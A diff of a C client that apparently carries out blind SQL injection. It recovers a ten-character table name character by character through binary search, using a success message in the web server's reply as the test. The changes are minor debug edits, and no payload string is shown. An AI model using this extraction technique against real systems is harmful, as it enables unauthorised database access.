@@ -196,7 +196,7 @@ bool recv_empty(int32_t sockfd) {
     const char *ptr = strstr(buf, "Your order has been sent!");
 
     #ifdef __MY_DEBUG__
-        puts(buf);
+        //puts(buf);
     #endif
 
     free(buf);
@@ -225,13 +225,18 @@ bool send_check_success(char * discovered_name, int sockfd) {
 
 
 void binary_search(char * discovered_name, int sockfd) {
+#ifdef __MY_DEBUG__
+    int count = 0;
+#endif
     for (int i = 0; i < 10; i++) {
         char low = 0x20;
         char high = 0x5f;
         while (low <= high) {
-            char mid = low + (high - low) / 2;
+            char mid = (char)(low + (high - low) / 2);
             discovered_name[i] = mid;
-
+        #ifdef __MY_DEBUG__
+            count++;
+        #endif
             if (send_check_success(discovered_name, sockfd)) {
                 low=mid+1;
             }
@@ -240,14 +245,15 @@ void binary_search(char * discovered_name, int sockfd) {
             }
         }
     }
+#ifdef __MY_DEBUG__
+    printf("%d",count);
+#endif
 }
 
 int32_t main() {
     int32_t sockfd = create_socket();
 
     _connect(sockfd, WEB_ADDR, 80);
-
-    char mal_req[1024];
 
     char table_name[11] = {0};
 
